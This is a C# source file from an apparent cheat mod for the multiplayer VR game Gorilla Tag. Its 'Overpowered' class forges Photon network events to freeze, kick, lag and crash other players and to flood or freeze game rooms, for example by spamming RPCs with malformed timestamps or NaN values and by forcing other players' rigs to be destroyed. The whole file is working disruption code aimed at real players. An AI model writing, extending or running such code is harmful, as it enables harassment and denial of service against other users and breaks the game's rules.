using System;
using System.Collections;
using System.Collections.Generic;
using System.Reflection;
using ExitGames.Client.Photon;
using GorillaNetworking;
using GorillaTagScripts;
using Photon.Pun;
using Photon.Realtime;
using EClient.Libs;
using EClient.Utilities;
using UnityEngine;
using HarmonyLib;

namespace EClient.Mods
{
    internal class Overpowered
    {
        public static void FreezeRigGun(bool all)
        {
            GunLib.GunLibData gunLibData = GunLib.ShootLock();
            bool flag = gunLibData.isShooting && gunLibData.isTriggered && Time.time > Overpowered.cooldown;
            if (flag)
            {
                List<int> list = new List<int>();
                foreach (Player player in PhotonNetwork.PlayerListOthers)
                {
                    bool flag2 = player != gunLibData.lockedPlayer.Creator.GetPlayerRef();
                    if (flag2)
                    {
                        list.Add(player.ActorNumber);
                    }
                }
                LoadBalancingClient networkingClient = PhotonNetwork.NetworkingClient;
                byte b = 202;
                ExitGames.Client.Photon.Hashtable hashtable = new ExitGames.Client.Photon.Hashtable();
                hashtable.Add(0, "Player Network Controller");
                hashtable.Add(6, PhotonNetwork.ServerTimestamp);
                hashtable.Add(4, new int[]
                {
                    Overpowered.GetPv(gunLibData.lockedPlayer).ViewID,
                    Overpowered.GetPv(gunLibData.lockedPlayer).ViewID
                });
                hashtable.Add(7, Overpowered.GetPv(gunLibData.lockedPlayer).ViewID);
                networkingClient.OpRaiseEvent(b, hashtable, new RaiseEventOptions
                {
                    TargetActors = list.ToArray()
                }, SendOptions.SendReliable);
                if (all)
                {
                    PhotonNetwork.RemoveInstantiatedGO(Overpowered.GetPv(gunLibData.lockedPlayer).gameObject, true);
                }
                Overpowered.cooldown = Time.time + 0.5f;
            }
        }
        public static IEnumerator FreezeServerC()
        {
            int num;
            for (int i = 0; i < 100; i = num + 1)
            {
                try
                {
                    CosmeticsController.instance.ProcessExternalUnlock(null, true, false);
                }
                catch
                {

                }
                yield return new WaitForSeconds(0.02f);
                num = i;
            }
            Dictionary<byte, object> dick = new Dictionary<byte, object>();
            PhotonNetwork.NetworkingClient.LoadBalancingPeer.SendOperation(byte.MaxValue, dick, SendOptions.SendReliable);
            yield break;
        }
        public static void FreezeServer() { var net = UnityEngine.Object.FindAnyObjectByType<BuilderTableNetworking>(); if (net != null) net.StartCoroutine(FreezeServerC()); }
        public static IEnumerator KickPlayer(Player Target)
        {
            Traverse.Create(GameObject.Find("PhotonMono").GetComponent<PhotonHandler>()).Field("nextSendTickCountOnSerialize").SetValue((int)(Time.realtimeSinceStartup * 9999f));
            yield return new WaitForSeconds(0.5f);
            int num;
            for (int i = 0; i < 3960; i = num + 1)
            {
                PhotonView pv = FriendshipGroupDetection.Instance.photonView;
                ExitGames.Client.Photon.Hashtable hashtable = new ExitGames.Client.Photon.Hashtable();
                hashtable.Add(0, pv.ViewID);
                hashtable.Add(2, PhotonNetwork.ServerTimestamp + -2147483647);
                hashtable.Add(3, "VerifyPartyMember");
                hashtable.Add(5, 70);
                ExitGames.Client.Photon.Hashtable rpcHash = hashtable;
                LoadBalancingPeer loadBalancingPeer = PhotonNetwork.NetworkingClient.LoadBalancingPeer;
                byte b = 200;
                object obj = rpcHash;
                RaiseEventOptions raiseEventOptions = new RaiseEventOptions
                {
                    TargetActors = new int[]
                    {
                        Target.ActorNumber
                    },
                    InterestGroup = pv.Group
                };
                SendOptions sendOptions = default(SendOptions);
                sendOptions.Reliability = true;
                sendOptions.DeliveryMode = (DeliveryMode)3;
                sendOptions.Encrypt = false;
                loadBalancingPeer.OpRaiseEvent(b, obj, raiseEventOptions, sendOptions);
                pv = null;
                rpcHash = null;
                num = i;
                pv = null;
                rpcHash = null;
            }
            yield break;
        }
        // ProcessedBy_MiDeobf_Engine_b3.2.r3 RVA: 0x000152B8
        public static void KickGun()
        {
            GunLib.GunLibData gunLibData = GunLib.ShootLock();
            bool flag = gunLibData.isShooting && gunLibData.isTriggered;
            if (flag)
            {
                Overpowered.SetTick(9999f);
                bool flag2 = Overpowered.kick == null;
                if (flag2)
                {
                    Overpowered.kick = Coroutines.instance.StartCoroutine(EClient.Mods.Overpowered.KickPlayer(gunLibData.lockedPlayer.Creator.GetPlayerRef()));
                    PhotonNetwork.SendAllOutgoingCommands();
                }
            }
            else
            {
                bool flag3 = Overpowered.kick != null;
                if (flag3)
                {
                    Overpowered.SetTick(1000f);
                    Coroutines.instance.StopCoroutine(Overpowered.kick);
                    Overpowered.kick = null;
                }
            }
        }

        // ProcessedBy_MiDeobf_Engine_b3.2.r3 RVA: 0x00015358
        public static void CrashGun(float delay, int foramount)
        {
            GunLib.GunLibData gunLibData = GunLib.ShootLock();
            bool flag = gunLibData.isShooting && gunLibData.isTriggered;
            if (flag)
            {
                bool flag2 = Time.time > Overpowered.cooldown;
                if (flag2)
                {
                    Overpowered.cooldown = Time.time + delay;
                    for (int i = 0; i < foramount; i++)
                    {
                        PhotonNetwork.NetworkingClient.OpRaiseEvent(204, new object[]
                        {
                            "Untitled official"
                        }, new RaiseEventOptions
                        {
                            CachingOption = 0,
                            TargetActors = new int[]
                            {
                                gunLibData.lockedPlayer.Creator.ActorNumber
                            }
                        }, SendOptions.SendReliable);
                    }
                }
            }
        }

        // ProcessedBy_MiDeobf_Engine_b3.2.r3 RVA: 0x0001540C
        public static void CrashAll(float delay, int foramount)
        {
            bool flag = Time.time > Overpowered.cooldown;
            if (flag)
            {
                Overpowered.cooldown = Time.time + delay;
                for (int i = 0; i < foramount; i++)
                {
                    PhotonNetwork.NetworkingClient.OpRaiseEvent(204, new object[]
                    {
                        "Untitled official"
                    }, new RaiseEventOptions
                    {
                        CachingOption = 0,
                        Receivers = 0
                    }, SendOptions.SendReliable);
                }
            }
        }
        //Reg
        // ProcessedBy_MiDeobf_Engine_b3.2.r3 RVA: 0x00014474
        public static IEnumerator CrashPlayer(Player Target)
        {
            Traverse.Create(GameObject.Find("PhotonMono").GetComponent<PhotonHandler>()).Field("nextSendTickCountOnSerialize").SetValue((int)(Time.realtimeSinceStartup * 9999f));
            yield return new WaitForSeconds(0.5f);
            int num;
            for (int i = 0; i < 150; i = num + 1)
            {
                PhotonView pv = FriendshipGroupDetection.Instance.photonView;
                ExitGames.Client.Photon.Hashtable hashtable = new ExitGames.Client.Photon.Hashtable();
                hashtable.Add(0, pv.ViewID);
                hashtable.Add(2, PhotonNetwork.ServerTimestamp + -2147483647);
                hashtable.Add(3, "VerifyPartyMember");
                hashtable.Add(5, float.NaN);
                ExitGames.Client.Photon.Hashtable rpcHash = hashtable;
                LoadBalancingPeer loadBalancingPeer = PhotonNetwork.NetworkingClient.LoadBalancingPeer;
                byte b = 200;
                object obj = rpcHash;
                RaiseEventOptions raiseEventOptions = new RaiseEventOptions
                {
                    TargetActors = new int[]
                    {
                        Target.ActorNumber
                    },
                    InterestGroup = pv.Group
                };
                SendOptions sendOptions = default(SendOptions);
                sendOptions.Reliability = true;
                sendOptions.DeliveryMode = DeliveryMode.ReliableUnsequenced;
                sendOptions.DeliveryMode = (DeliveryMode)3;
                sendOptions.Encrypt = false;
                loadBalancingPeer.OpRaiseEvent(b, obj, raiseEventOptions, sendOptions);
                pv = null;
                rpcHash = null;
                num = i;
                pv = null;
                rpcHash = null;
            }
            yield break;
        }
        public static void LagGun()
        {
            GunLib.GunLibData gunLibData = GunLib.ShootLock();
            bool flag = gunLibData.isShooting && gunLibData.isTriggered && Time.time > Overpowered.cooldown;
            if (flag)
            {
                Overpowered.ForceDestroy(Overpowered.GetPv(gunLibData.lockedPlayer).gameObject, gunLibData.lockedPlayer.Creator);
                Overpowered.cooldown = Time.time + 0.05f;
            }
        }

        // ProcessedBy_MiDeobf_Engine_b3.2.r3 RVA: 0x000151D8
        public static void LagAll()
        {
            GunLib.GunLibData gunLibData = GunLib.ShootLock();
            foreach (VRRig vrrig in GorillaParent.instance.vrrigs)
            {
                bool flag = !vrrig.isOfflineVRRig;
                if (flag)
                {
                    Overpowered.ForceDestroy(Overpowered.GetPv(vrrig).gameObject, gunLibData.lockedPlayer.Creator);
                    Overpowered.cooldown = Time.time + 0.07f;
                }
            }
        }

        // ProcessedBy_MiDeobf_Engine_b3.2.r3 RVA: 0x00015270
        public static void LagPlayer(VRRig rig)
        {
            bool flag = Time.time > Overpowered.cooldown;
            if (flag)
            {
                Overpowered.ForceDestroy(Overpowered.GetPv(rig).gameObject, rig.Creator);
                Overpowered.cooldown = Time.time + 0.07f;
            }
        }
        public static void ForceDestroy(GameObject view, NetPlayer player)
        {
            int viewID = view.GetComponent<PhotonView>().ViewID;
            LoadBalancingClient networkingClient = PhotonNetwork.NetworkingClient;
            byte b = 202;
            ExitGames.Client.Photon.Hashtable hashtable = new ExitGames.Client.Photon.Hashtable();
            hashtable.Add(0, "Player Network Controller");
            hashtable.Add(6, PhotonNetwork.ServerTimestamp);
            hashtable.Add(4, new int[]
            {
                GorillaTagger.Instance.myVRRig.ViewID,
                viewID
            });
            hashtable.Add(7, GorillaTagger.Instance.myVRRig.ViewID);
            networkingClient.OpRaiseEvent(b, hashtable, new RaiseEventOptions
            {
                TargetActors = new int[]
                {
                    player.ActorNumber
                }
            }, SendOptions.SendReliable);
        }
        public static PhotonView GetPv(VRRig rig)
        {
            return Traverse.Create(rig).Field("netView").GetValue<NetworkView>().GetView;
        }

        // ProcessedBy_MiDeobf_Engine_b3.2.r3 RVA: 0x000144C0
        public static PhotonView GetPv(Player rig)
        {
            return  EClient.Utilities.Rig.GetViewFromPlayer(rig);
        }
        public static void SetTick(float tick)
        {
            Traverse.Create(GameObject.Find("PhotonMono").GetComponent<PhotonHandler>()).Field("nextSendTickCountOnSerialize").SetValue((int)(Time.realtimeSinceStartup * tick));
        }

        // Token: 0x040000E6 RID: 230
        public static GameObject ray;

        // Token: 0x040000E7 RID: 231
        public static bool timeout;

        // Token: 0x040000E8 RID: 232
        public static float cooldown;

        // Token: 0x040000E9 RID: 233
        public static float cooldown2;

        // Token: 0x040000EA RID: 234
        public static float flint;

        // Token: 0x040000EB RID: 235
        public static int counter;

        // Token: 0x040000EC RID: 236
        public static int countercams;

        // Token: 0x040000ED RID: 237
        public static int countercamsdih;

        public static int counterclock;

        // Token: 0x040000EE RID: 238
        public static List<GameObject> cams = new List<GameObject>();

        // Token: 0x040000EF RID: 239
        public static List<GameObject> camsdih = new List<GameObject>();

        // Token: 0x040000F0 RID: 240
        public static Coroutine kick = null;

        // Token: 0x040000F1 RID: 241
        public static Coroutine crash = null;
    }
}
